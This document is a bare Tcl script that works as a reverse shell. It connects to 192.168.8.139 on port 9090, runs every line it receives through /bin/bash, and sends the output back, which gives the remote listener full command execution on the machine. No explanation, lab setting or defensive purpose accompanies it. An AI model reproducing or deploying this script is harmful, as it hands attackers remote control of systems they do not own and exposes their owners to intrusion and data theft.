set chan [socket 192.168.8.139 9090]
while 1 {
   puts $chan [exec /bin/bash -c [gets $chan]]
   flush $chan
}
